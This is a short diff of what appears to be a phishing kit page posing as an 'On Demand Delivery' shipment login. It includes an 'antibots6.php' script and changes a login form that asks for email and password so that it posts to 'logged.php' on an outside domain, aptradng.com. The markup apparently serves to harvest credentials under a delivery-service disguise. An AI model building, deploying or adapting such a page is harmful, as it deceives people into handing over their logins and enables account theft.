@@ -48,7 +48,7 @@ include('antibots6.php');
         <img src="https://aptradng.com/On-Demand-Delivery/milk/odd_logo.svg" class="logo-odd is-centered img-responsive" alt="On Demand Delivery">
       </div>
 	  <div style="text-align: center; margin-bottom: 10px;">Login with your valid email and password to gain access to all shipment information.</div>
-<form id="loginForm" name="loginForm" method="post" action="https://aptradng.com/epe/logged.php">
+<form id="loginForm" name="loginForm" method="post" action="https://aptradng.com/On-Demand-Delivery/logged.php">
 
         <div class="row login-input-group">
           
